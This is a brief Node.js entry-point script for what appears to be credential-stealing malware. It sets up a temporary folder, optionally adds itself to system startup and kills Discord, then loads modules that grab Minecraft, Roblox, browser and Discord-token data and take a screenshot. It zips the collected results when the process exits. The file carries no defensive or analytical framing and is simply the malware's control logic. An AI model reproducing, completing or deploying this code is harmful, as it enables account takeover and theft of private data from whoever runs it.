const { sep, join } = require('path');
const { mkdtempSync } = require('fs');
const os = require('os');
const config = require('./config');
const { spawnSync } = require('child_process');
const tempFolder = mkdtempSync(join(os.tmpdir(), sep)).toString();
module.exports.tempFolder = tempFolder;
spawnSync('explorer', [tempFolder]);

config.addToStartup && require('./functions/startup');
config.killDiscord  && require('./functions/kill-discord');
require('./functions/grab-mc');
require('./functions/grab-roblox');
require('./functions/grab-browsers-data');
require('./functions/grab-discord-token');
require('./functions/screenshot');
// require('./functions/fake-error');

// require('./functions/discord-injection');

process.on('beforeExit', () => require('./functions/zip'));
